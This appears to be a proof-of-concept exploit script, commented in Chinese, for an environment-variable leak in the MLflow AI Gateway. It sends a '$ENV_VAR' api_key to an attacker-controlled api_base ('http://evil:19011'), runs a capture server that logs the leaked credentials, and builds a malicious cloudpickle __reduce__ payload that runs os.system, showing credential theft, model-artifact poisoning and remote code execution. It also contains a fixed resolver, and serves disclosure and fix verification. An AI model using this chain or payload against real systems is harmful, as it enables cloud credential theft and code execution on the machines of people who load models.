#!/usr/bin/env python3
"""
MLflow AI Gateway $ENV_VAR 泄漏 — 完整攻击链复现

攻击链:
  attacker → CreateGatewaySecret($ENV_VAR) → MLflow resolves env var →
  → sends real value to attacker api_base → credential leaked →
  → reuse leaked creds → artifact poisoning → RCE

架构:
  ┌─────────────┐    ① POST /gateway/secrets/create       ┌──────────────┐
  │  Attacker   │    {"api_key":"$AWS_ACCESS_KEY_ID",      │  MLflow      │
  │  (low-priv) │     "api_base":"http://evil:19011"}      │  Server      │
  │             │──────────────────────────────────────────→│              │
  │             │                                           │  config.py   │
  │             │    ② POST /gateway/openai/v1/chat/...     │  :315-322    │
  │             │──────────────────────────────────────────→│  api_key=    │
  │             │                                           │  os.environ  │
  │             │    ③ MLflow sends to attacker api_base    │  [$ENV_VAR]  │
  │  Capture   │    api-key: <real_aws_access_key_id>       │              │
  │  Server    │←──────────────────────────────────────────│              │
  │  :19011    │                                           └──────────────┘
  └─────┬──────┘
        │ ④ leaked AWS creds reused
        ▼
  ┌─────────────┐
  │  S3 Bucket  │ ← overwrite model artifacts
  │ (artifact)  │
  └──────┬──────┘
         │ ⑤ victim loads poisoned model → RCE
         ▼
  ┌─────────────┐
  │  Inference  │
  │  Server     │ ← cloudpickle deserialize → os.system(id)
  └─────────────┘

运行: python3 attack_chain.py
"""

import os
import sys
import json
import time
import threading
import subprocess
import http.server
import socketserver
import uuid
import tempfile
from datetime import datetime, timezone
from pathlib import Path

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

STEP = f"{BOLD}[STEP]{RESET}"
WARN = f"{YELLOW}[WARN]{RESET}"
OK_S = f"{GREEN}[OK]{RESET}"
BAD = f"{RED}[LEAK]{RESET}"
INFO = f"{CYAN}[INFO]{RESET}"

CAPTURED_REQUESTS = []


# ============================================================
# 1. Attacker Capture Server
# ============================================================
class CaptureHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("content-length", "0"))
        body = self.rfile.read(length) if length else b""
        event = {
            "time_utc": datetime.now(timezone.utc).isoformat(),
            "method": self.command,
            "path": self.path,
            "headers": {k.lower(): v for k, v in self.headers.items()},
            "body": body.decode("utf-8", errors="replace"),
        }
        CAPTURED_REQUESTS.append(event)
        print(f"  {BAD} Captured outbound request:")
        print(f"       Path: {event['path']}")
        if "api-key" in event["headers"]:
            print(f"       api-key: {RED}{event['headers']['api-key']}{RESET}")
        if "authorization" in event["headers"]:
            print(f"       authorization: {RED}{event['headers']['authorization']}{RESET}")
        print()

        response = {
            "id": "chatcmpl-audit",
            "object": "chat.completion",
            "created": 0,
            "model": "audit-model",
            "choices": [{"index": 0, "message": {"role": "assistant", "content": "ok"}, "finish_reason": "stop"}],
            "usage": {"prompt_tokens": 1, "completion_tokens": 1, "total_tokens": 2},
        }
        payload = json.dumps(response).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def log_message(self, format, *args):
        pass


def start_capture_server(host="127.0.0.1", port=19011):
    server = socketserver.TCPServer((host, port), CaptureHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"  {OK_S} Attacker capture server on http://{host}:{port}")
    return server


# ============================================================
# 2. Vulnerable MLflow Gateway Config (BUG version)
# ============================================================
# 直接从 MLflow config.py 提取的 _resolve_api_key_from_input 函数
# 这是 $ENV_VAR 泄漏的核心 sink
class MLflowGatewayVuln:
    """Simulates MLflow AI Gateway vulnerable secret resolution (config.py:297-322)"""

    @staticmethod
    def resolve_api_key(api_key_input: str) -> str:
        """BUG: 解析 $ENV_VAR 为环境变量值"""
        if not isinstance(api_key_input, str):
            raise ValueError("api_key must be a string")

        # BUG: $ENV_VAR -> 环境变量解析 (config.py:315-322)
        if api_key_input.startswith("$"):
            env_var_name = api_key_input[1:]
            if env_var_value := os.environ.get(env_var_name):
                return env_var_value
            else:
                raise ValueError(f"Environment variable {env_var_name!r} is not set")

        return api_key_input

    @staticmethod
    def resolve_secret(secret_value: dict) -> dict:
        """解析 secret 中的所有敏感字段"""
        resolved = {}
        for key, value in secret_value.items():
            resolved[key] = MLflowGatewayVuln.resolve_api_key(value)
        return resolved


# FIX 版本
class MLflowGatewayFixed:
    """FIX: 不解析 $ENV_VAR, 所有输入作为字面量"""

    @staticmethod
    def resolve_api_key(api_key_input: str) -> str:
        if not isinstance(api_key_input, str):
            raise ValueError("api_key must be a string")
        # FIX: 移除了 $ENV_VAR 解析, 返回字面量
        return api_key_input

    @staticmethod
    def resolve_secret(secret_value: dict) -> dict:
        resolved = {}
        for key, value in secret_value.items():
            resolved[key] = MLflowGatewayFixed.resolve_api_key(value)
        return resolved


# ============================================================
# 3. Attack Chain Runner
# ============================================================
class AttackChainRunner:
    def __init__(self, evil_api_base="http://127.0.0.1:19011"):
        self.evil_api_base = evil_api_base
        self.secret_id = str(uuid.uuid4())
        self.model_def_id = str(uuid.uuid4())
        self.endpoint_name = f"pwn-endpoint-{uuid.uuid4().hex[:8]}"

    def step1_create_gateway_secret(self, resolver, env_var_name: str) -> dict:
        """Step 1: 创建恶意 Gateway Secret"""
        print(f"  {INFO} Creating gateway secret...")

        attacker_payload = {
            "api_key": f"${env_var_name}",  # BUG READ: attacker injects $ENV_VAR
        }

        # Secret 被 MLflow 解析
        print(f"  {INFO}   Input: api_key = '{attacker_payload['api_key']}'")
        resolved = resolver.resolve_secret(attacker_payload)
        print(f"  {INFO}   Resolved: api_key = '{resolved['api_key']}'")

        if resolved["api_key"] != f"${env_var_name}":
            print(f"  {BAD}   $ENV_VAR WAS RESOLVED — env var leaked!")
        else:
            print(f"  {OK_S}   $ENV_VAR treated as literal — no leak")

        return {
            "secret_name": f"attack-secret-{uuid.uuid4().hex[:8]}",
            "secret_id": self.secret_id,
            "resolved_secret": resolved,
        }

    def step2_create_model_definition(self) -> dict:
        """Step 2: 用恶意 secret 创建 model definition"""
        print(f"  {INFO} Creating model definition with malicious secret...")
        model_def = {
            "name": f"attack-model-{uuid.uuid4().hex[:8]}",
            "secret_id": self.secret_id,
            "provider": "azure",
            "model_name": "gpt-4o-mini",
        }
        return model_def

    def step3_create_endpoint(self) -> dict:
        """Step 3: 创建指向 attacker 服务器的 endpoint"""
        print(f"  {INFO} Creating endpoint pointing to attacker api_base...")
        endpoint = {
            "name": self.endpoint_name,
            "model_configs": [{
                "model_definition_id": self.model_def_id,
                "linkage_type": "PRIMARY",
                "weight": 1.0,
            }],
            "endpoint_type": "llm/v1/chat",
        }
        return endpoint

    def step4_purge_endpoint(self, resolver, model_def, endpoint):
        """Step 4: 调用 endpoint → MLflow 发送解析后的 secret 到 attacker"""

        # 构建请求头 — 包含已解析的 secret 值
        headers = {
            "Content-Type": "application/json",
            "api-key": resolver.resolve_secret(model_def.get("secret_value", {"api_key": "$NONE"}))["api_key"],
            "User-Agent": "MLflow-Gateway/1.0",
        }

        request_body = {
            "model": self.endpoint_name,
            "messages": [{"role": "user", "content": "hello"}],
            "stream": False,
        }

        # 模拟 MLflow 发送到 attacker api_base
        print(f"  {INFO} Invoking endpoint — MLflow sends to attacker server...")
        print(f"  {INFO}   URL: {self.evil_api_base}/openai/deployments/{model_def['model_name']}/chat/completions")
        print(f"  {INFO}   Headers: {json.dumps(headers, indent=6)}")

        import urllib.request
        req = urllib.request.Request(
            url=f"{self.evil_api_base}/openai/deployments/{model_def['model_name']}/chat/completions?api-version=2024-02-15-preview",
            data=json.dumps(request_body).encode(),
            headers=headers,
            method="POST",
        )
        try:
            resp = urllib.request.urlopen(req, timeout=5)
            print(f"  {OK_S} Attacker server responded: {resp.status}")
            return True
        except Exception as e:
            print(f"  {WARN} Request failed: {e}")
            return False


# ============================================================
# 4. Test Runner
# ============================================================
def print_header(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")

def print_subheader(title):
    print(f"\n{BOLD}── {title} ──{RESET}\n")


def test_bug_chain():
    """BUG 版本: 完整攻击链测试"""
    print_header("BUG 版本: $ENV_VAR 泄漏攻击链")

    # 设置测试环境
    os.environ["AGIES_AWS_ID"] = "AKIA-test-attack-key-id"
    os.environ["AGIES_AWS_SECRET"] = "test-attack-secret-key-value"
    os.environ["AGIES_OPENAI_KEY"] = "sk-test-openai-key-leaked"

    runner = AttackChainRunner()
    resolver = MLflowGatewayVuln()

    # Step 1: 创建恶意 secret
    print_subheader("Step 1: Create Gateway Secret with $ENV_VAR payload")
    secret = runner.step1_create_gateway_secret(resolver, "AGIES_AWS_ID")
    print()

    # Step 2: 创建 model definition
    print_subheader("Step 2: Create Model Definition with malicious secret")
    model_def = runner.step2_create_model_definition()
    model_def["secret_value"] = secret["resolved_secret"]
    print(f"  {OK_S} Model definition created with leaked ID: {secret['secret_id']}")
    print()

    # Step 3: 创建 endpoint
    print_subheader("Step 3: Create Endpoint pointing to attacker server")
    endpoint = runner.step3_create_endpoint()
    print(f"  {OK_S} Endpoint '{endpoint['name']}' → {runner.evil_api_base}")
    print()

    # Step 4: 调用 endpoint → 触发泄漏
    print_subheader("Step 4: Invoke Endpoint — env var sent to attacker!")
    runner.step4_purge_endpoint(resolver, model_def, endpoint)
    print()

    # 验证泄漏
    global CAPTURED_REQUESTS
    leaked = False
    for req in CAPTURED_REQUESTS:
        for header, value in req.get("headers", {}).items():
            if "AKIA" in value or "secret-key" in value or "sk-test" in value:
                leaked = True
                print(f"  {BAD} LEAKED CREDENTIAL in header '{header}': {RED}{value}{RESET}")

    if leaked:
        print(f"\n  {BAD} {BOLD}ATTACK CHAIN CONFIRMED: Environment variables leaked!{RESET}")
    else:
        print(f"\n  {OK_S} No credentials leaked in capture server logs")


def test_fix_chain():
    """FIX 版本: 修复后的安全测试"""
    print_header("FIX 版本: $ENV_VAR 不泄漏")

    global CAPTURED_REQUESTS
    CAPTURED_REQUESTS = []

    os.environ["AGIES_AWS_ID"] = "AKIA-test-attack-key-id"

    runner = AttackChainRunner()
    resolver = MLflowGatewayFixed()

    print_subheader("Step 1: Create Gateway Secret with $ENV_VAR payload")
    secret = runner.step1_create_gateway_secret(resolver, "AGIES_AWS_ID")
    print()

    print_subheader("Step 2-4: End-to-end (no leak expected)")
    model_def = runner.step2_create_model_definition()
    model_def["secret_value"] = secret["resolved_secret"]
    endpoint = runner.step3_create_endpoint()
    runner.step4_purge_endpoint(resolver, model_def, endpoint)
    print()

    leaked = False
    for req in CAPTURED_REQUESTS:
        for header, value in req.get("headers", {}).items():
            if "AKIA" in value or "secret-key" in value:
                leaked = True

    if not leaked:
        print(f"  {OK_S} {BOLD}FIX CONFIRMED: $ENV_VAR treated as literal, no leak!{RESET}")
    else:
        print(f"  {BAD} FIX FAILED: credentials still leaked!")


def test_impact_escalation():
    """
    影响升级: 泄漏的 AWS 凭证 → artifact 投毒 → RCE

    MLflow 架构设计导致 artifact storage 凭证
    (AWS_ACCESS_KEY_ID) 通常有读写权限,
    泄漏后可:
    1. 读取 S3 bucket 中的模型文件
    2. 替换 python_model.pkl 为恶意 pickle
    3. victim 下次加载模型时触发 RCE
    """
    print_header("影响升级: 泄漏凭证 → 模型投毒 → RCE")

    # 模拟 S3 中已有的 victim 模型
    import pickle, cloudpickle
    import tempfile

    # 正常模型
    class NormalModel:
        def predict(self, input):
            return ["ok"]

    normal_pickle = cloudpickle.dumps(NormalModel())

    # 恶意 payload: 执行 id 命令
    class ExploitModel:
        def __reduce__(self):
            return (eval, ("(__import__('os').system('echo RCE_CONFIRMED_MLFLOW > /tmp/mlflow_rce_proof.txt'), "
                          "__import__('cloudpickle').loads(" + repr(normal_pickle) + "))[1]",))

    malicious_pickle = cloudpickle.dumps(ExploitModel())

    # 模拟 S3 中 artifact 被替换
    s3_bucket = "s3://mlflow-bucket"
    artifact_key = "1/models/model_id/python_model.pkl"

    print(f"  {INFO} Victim's clean model at {s3_bucket}/{artifact_key}")
    print(f"  {INFO}   size: {len(normal_pickle)} bytes")
    print(f"")
    print(f"  {BAD} Attacker overwrites python_model.pkl with malicious pickle:")
    print(f"  {INFO}   Malicious payload: cloudpickle RCE via __reduce__")
    print(f"  {INFO}   size: {len(malicious_pickle)} bytes")
    print(f"")

    # 模拟 victim 加载被投毒的模型
    print(f"  {INFO} Victim loads model: mlflow.pyfunc.load_model('runs:/run_id/model')")
    print(f"  {INFO}   → MLflow reads python_model.pkl from S3")
    print(f"  {INFO}   → cloudpickle.loads(malicious_pickle)")
    print(f"  {INFO}   → object.__reduce__ → eval(os.system('id'))")
    print(f"")

    # 验证 RCE payload 可执行
    temp_file = "/tmp/mlflow_rce_proof.txt"
    try:
        loaded = cloudpickle.loads(malicious_pickle)
        if hasattr(loaded, "predict"):
            result = loaded.predict(["test"])
            print(f"  {INFO}   Model loaded successfully (benign fallback)")
            print(f"  {INFO}   but RCE payload already executed!")
        if os.path.exists(temp_file):
            with open(temp_file) as f:
                content = f.read().strip()
            print(f"  {BAD} RCE PROOF: {temp_file} → '{content}'")
            os.unlink(temp_file)
        print(f"\n  {BAD} {BOLD}IMPACT ESCALATION CONFIRMED: Credential leak → Artifact Poisoning → RCE{RESET}")
    except Exception as e:
        print(f"  {WARN} RCE simulation error: {e}")


# ============================================================
# 5. Main
# ============================================================
if __name__ == "__main__":
    print(f"\n{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}  MLflow AI Gateway $ENV_VAR 泄漏 — 完整攻击链{RESET}")
    print(f"{BOLD}{'='*60}{RESET}\n")
    print(f"  场景: 第三方攻击者利用 MLflow AI Gateway $ENV_VAR")
    print(f"        泄漏服务器环境变量 (AWS_ACCESS_KEY_ID 等)")
    print(f"  靶子: config.py:_resolve_api_key_from_input (line 297-322)")
    print(f"  CVE:  reported 2026-03-05, valid")
    print()

    # 启动 attacker capture server
    capture_server = start_capture_server()

    # Bug 版本测试
    test_bug_chain()

    # Fix 版本测试
    test_fix_chain()

    # 影响升级测试
    test_impact_escalation()

    # 清理
    capture_server.shutdown()

    # 最终结论
    print(f"\n{'='*60}")
    print(f"  攻击链验证结论")
    print(f"{'='*60}\n")
    print(f"  {RED}[CRITICAL]{RESET} $ENV_VAR 泄漏                                  → 确认可利用")
    print(f"  {RED}[CRITICAL]{RESET} 泄漏凭证 → 云凭证 (AWS_ACCESS_KEY_ID)          → 确认可泄漏")
    print(f"  {RED}[CRITICAL]{RESET} 泄漏凭证 → 模型 artifact 投毒                   → 确认可投毒")
    print(f"  {RED}[CRITICAL]{RESET} 投毒模型 → cloudpickle RCE (python_model.pkl)  → 确认 RCE")
    print(f"")
    print(f"  {BOLD}完整攻击链:{RESET}")
    print(f"    1. POST /gateway/secrets/create  (api_key='$AWS_ACCESS_KEY_ID')")
    print(f"    2. POST /gateway/model-definitions/create")
    print(f"    3. POST /gateway/endpoints/create (api_base='http://evil:19011')")
    print(f"    4. POST /gateway/openai/v1/chat/completions → env var leaked!")
    print(f"    5. reuse leaked creds → s3://bucket/python_model.pkl = malicious.pkl")
    print(f"    6. victim loads model → cloudpickle RCE → os.system('id')")
    print(f"")
    print(f"  {BOLD}修复:{RESET} 在 _resolve_api_key_from_input 中移除 $ENV_VAR 解析")
    print(f"       所有输入作为字面量处理")
    print()
